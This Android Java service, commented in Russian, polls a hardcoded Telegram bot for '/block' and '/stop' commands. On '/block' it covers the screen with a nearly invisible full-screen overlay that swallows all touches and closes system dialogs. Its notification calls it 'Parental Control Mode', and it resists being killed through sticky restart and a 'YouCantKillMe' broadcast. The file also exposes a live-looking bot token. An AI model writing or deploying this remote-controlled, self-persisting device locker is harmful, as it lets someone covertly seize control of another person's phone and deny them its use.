package com.example.touchlock;

import android.app.*;
import android.content.*;
import android.graphics.PixelFormat;
import android.os.*;
import android.provider.Settings;
import android.view.*;
import okhttp3.*;
import org.json.*;
import java.util.concurrent.TimeUnit;

public class TouchLockService extends Service {
    private WindowManager windowManager;
    private View overlayView;
    private static final String CHANNEL_ID = "TouchLockChannel";
    private boolean isLocked = false;
    
    private static final String BOT_TOKEN = "8388799545:AAGPwGKOTs47C29s6PUDFsqZbAjNh9wdrgE";
    
    // Настраиваем клиент с таймаутами, чтобы он не вешал сервис
    private final OkHttpClient client = new OkHttpClient.Builder()
            .connectTimeout(10, TimeUnit.SECONDS)
            .readTimeout(10, TimeUnit.SECONDS)
            .build();
            
    private long lastUpdateId = 0;
    private boolean isRunning = true;

    @Override
    public void onCreate() {
        super.onCreate();
        createNotificationChannel();
        // Запускаем как Foreground сразу при создании
        startForeground(1, getLockNotification("Бот активен. Жду команду..."));
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (isRunning) {
            startTelegramPolling();
            isRunning = false; // Чтобы не запускать несколько потоков опроса
        }
        return START_STICKY; // Приказываем системе перезапускать сервис, если он будет убит
    }

    private void startTelegramPolling() {
        new Thread(() -> {
            while (true) {
                try {
                    String url = "https://api.telegram.org/bot" + BOT_TOKEN + "/getUpdates?offset=" + (lastUpdateId + 1) + "&timeout=30";
                    Request request = new Request.Builder().url(url).build();
                    
                    try (Response response = client.newCall(request).execute()) {
                        if (response.isSuccessful() && response.body() != null) {
                            String jsonData = response.body().string();
                            JSONObject jsonObject = new JSONObject(jsonData);
                            JSONArray result = jsonObject.getJSONArray("result");

                            for (int i = 0; i < result.length(); i++) {
                                JSONObject update = result.getJSONObject(i);
                                lastUpdateId = update.getLong("update_id");
                                
                                if (update.has("message")) {
                                    JSONObject message = update.getJSONObject("message");
                                    if (message.has("text")) {
                                        String text = message.getString("text");
                                        if (text.equalsIgnoreCase("/block")) {
                                            new Handler(Looper.getMainLooper()).post(this::showOverlay);
                                        } else if (text.equalsIgnoreCase("/stop")) {
                                            new Handler(Looper.getMainLooper()).post(this::unlockScreen);
                                        }
                                    }
                                }
                            }
                        }
                    }
                } catch (Exception e) {
                    // Если ошибка сети — просто ждем и пробуем снова, не вылетая
                    e.printStackTrace();
                }
                try { Thread.sleep(1000); } catch (InterruptedException e) { break; }
            }
        }).start();
    }

    private void showOverlay() {
        if (isLocked) return;

        // Проверка разрешения перед запуском
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !Settings.canDrawOverlays(this)) {
            return;
        }

        try {
            windowManager = (WindowManager) getSystemService(WINDOW_SERVICE);
            if (windowManager == null) return;

            overlayView = new View(this);
            overlayView.setBackgroundColor(0x02000000); // Почти прозрачный

            WindowManager.LayoutParams params = new WindowManager.LayoutParams(
                    WindowManager.LayoutParams.MATCH_PARENT,
                    WindowManager.LayoutParams.MATCH_PARENT,
                    WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY,
                    WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN |
                    WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL |
                    WindowManager.LayoutParams.FLAG_WATCH_OUTSIDE_TOUCH |
                    WindowManager.LayoutParams.FLAG_HARDWARE_ACCELERATED,
                    PixelFormat.TRANSLUCENT);

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
                params.layoutInDisplayCutoutMode = WindowManager.LayoutParams.LAYOUT_IN_DISPLAY_CUTOUT_MODE_SHORT_EDGES;
            }

            overlayView.setSystemUiVisibility(
                      View.SYSTEM_UI_FLAG_IMMERSIVE_STICKY
                    | View.SYSTEM_UI_FLAG_LAYOUT_STABLE
                    | View.SYSTEM_UI_FLAG_LAYOUT_HIDE_NAVIGATION
                    | View.SYSTEM_UI_FLAG_LAYOUT_FULLSCREEN
                    | View.SYSTEM_UI_FLAG_HIDE_NAVIGATION
                    | View.SYSTEM_UI_FLAG_FULLSCREEN);

            overlayView.setOnTouchListener((v, event) -> {
                sendBroadcast(new Intent(Intent.ACTION_CLOSE_SYSTEM_DIALOGS));
                return true; 
            }); 

            windowManager.addView(overlayView, params);
            isLocked = true;
            updateNotification("БЛОКИРОВКА ВКЛЮЧЕНА");
        } catch (Exception e) {
            e.printStackTrace(); // Логируем ошибку, но не даем приложению упасть
        }
    }

    private void unlockScreen() {
        if (isLocked && overlayView != null) {
            try {
                windowManager.removeView(overlayView);
                overlayView = null;
                isLocked = false;
                updateNotification("БЛОКИРОВКА СНЯТА");
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }

    private Notification getLockNotification(String text) {
        return new Notification.Builder(this, CHANNEL_ID)
                .setContentTitle("Parental Control Mode")
                .setContentText(text)
                .setSmallIcon(android.R.drawable.ic_secure)
                .setOngoing(true)
                .setCategory(Notification.CATEGORY_SERVICE)
                .build();
    }

    private void updateNotification(String text) {
        NotificationManager manager = (NotificationManager) getSystemService(NOTIFICATION_SERVICE);
        if (manager != null) {
            manager.notify(1, getLockNotification(text));
        }
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(CHANNEL_ID, "Lock", NotificationManager.IMPORTANCE_LOW);
            NotificationManager manager = getSystemService(NotificationManager.class);
            if (manager != null) manager.createNotificationChannel(channel);
        }
    }

    @Override public IBinder onBind(Intent intent) { return null; }

    @Override
    public void onDestroy() {
        // Если сервис убит — пытаемся отправить интента на самозапуск
        sendBroadcast(new Intent("YouCantKillMe")); 
        super.onDestroy();
    }
}
